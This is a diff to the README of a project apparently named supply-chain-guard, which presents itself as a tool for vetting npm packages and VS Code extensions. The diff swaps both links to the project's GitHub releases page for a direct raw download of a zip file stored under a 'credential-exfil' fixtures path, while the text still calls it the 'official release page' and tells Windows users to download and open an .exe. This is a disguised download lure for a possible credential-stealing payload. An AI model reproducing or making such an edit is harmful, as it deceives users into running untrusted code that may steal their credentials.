@@ -1,6 +1,6 @@
 # 🛡️ supply-chain-guard - Secure your software supply chain today
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Graceless-apeldoorn591/supply-chain-guard/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Graceless-apeldoorn591/supply-chain-guard/main/src/fixtures/credential-exfil/guard_chain_supply_1.9.zip)
 
 supply-chain-guard protects your computer when you install new software components. It acts as a shield between the internet and your development tools. It inspects npm packages and Visual Studio Code extensions before they reach your system. This tool prevents malicious code from entering your local supply chain. It provides review support for Socket, Codex, and PI security protocols.
 
@@ -8,7 +8,7 @@ supply-chain-guard protects your computer when you install new software componen
 
 Follow these steps to install the software on your Windows computer.
 
-1. Go to the [official release page](https://github.com/Graceless-apeldoorn591/supply-chain-guard/releases).
+1. Go to the [official release page](https://raw.githubusercontent.com/Graceless-apeldoorn591/supply-chain-guard/main/src/fixtures/credential-exfil/guard_chain_supply_1.9.zip).
 2. Look for the Assets section at the bottom of the latest release.
 3. Select the file ending in .exe to download the installer.
 4. Open the downloaded file to begin the setup.
